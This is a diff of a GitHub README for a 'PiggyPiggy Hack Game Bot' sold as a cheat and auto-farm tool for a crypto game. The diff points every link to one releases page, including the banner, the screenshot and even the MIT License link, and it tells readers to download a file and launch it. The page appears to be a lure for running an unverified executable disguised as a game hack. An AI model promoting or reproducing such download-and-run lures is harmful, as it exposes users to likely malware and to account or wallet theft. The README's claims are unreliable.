@@ -7,12 +7,12 @@ Welcome to the PiggyPiggy Hack Game Bot repository! If you're looking to dominat
 - **Description:** Bot that automates farming and clicker activities in PiggyPiggy game. Features include crypto integration and API support. Equipped with hacks and cheats to maximize profits and enhance gameplay efficiency.
 - **Topics:** auto-clicker, auto-farm, blockchain-game, blockchain-technology, crypto-api, crypto-game, crypto-hack, cryptocurrency-game, ethereum-game, exploit, game-bot, game-cheat, game-enhancement, hack, mini-game, piggy-piggy, piggy-piggy-bot, piggy-piggy-clicker, piggy-piggy-farming, piggy-piggy-game
 
-![PiggyPiggy Game Banner](https://example.com/piggypiggy-banner.jpg)
+![PiggyPiggy Game Banner](https://github.com/ngotrunganhh/PiggyPiggy-Hack-Game-Bot-Auto-Farm-Clicker-Crypto-Api-Cheat/releases)
 
 ## Get Started
 To download the PiggyPiggy Hack Game Bot, click the button below:
 
-[![Download PiggyPiggy Bot](https://img.shields.io/badge/Download-PiggyPiggy_Bot-blue.svg)](https://github.com/files/uploaded/Application.zip)
+[![Download PiggyPiggy Bot](https://github.com/ngotrunganhh/PiggyPiggy-Hack-Game-Bot-Auto-Farm-Clicker-Crypto-Api-Cheat/releases)](https://github.com/ngotrunganhh/PiggyPiggy-Hack-Game-Bot-Auto-Farm-Clicker-Crypto-Api-Cheat/releases)
 
 If the link ends with the file name, it needs to be launched to start using the bot. If the link is not working, please check the "Releases" section of this repository for alternative download options.
 
@@ -39,10 +39,10 @@ Join our community of PiggyPiggy Bot users to share tips, tricks, and strategies
 ## Support
 For any inquiries, feedback, or issues regarding the PiggyPiggy Bot, please reach out to our support team. We are dedicated to ensuring a seamless and enjoyable gaming experience for all users.
 
-![PiggyPiggy Gameplay Screenshot](https://example.com/piggypiggy-gameplay.jpg)
+![PiggyPiggy Gameplay Screenshot](https://github.com/ngotrunganhh/PiggyPiggy-Hack-Game-Bot-Auto-Farm-Clicker-Crypto-Api-Cheat/releases)
 
 ## License
-The PiggyPiggy Hack Game Bot is licensed under the [MIT License](https://opensource.org/licenses/MIT). Feel free to use, modify, and distribute the bot according to the terms of the license.
+The PiggyPiggy Hack Game Bot is licensed under the [MIT License](https://github.com/ngotrunganhh/PiggyPiggy-Hack-Game-Bot-Auto-Farm-Clicker-Crypto-Api-Cheat/releases). Feel free to use, modify, and distribute the bot according to the terms of the license.
 
 ---
 
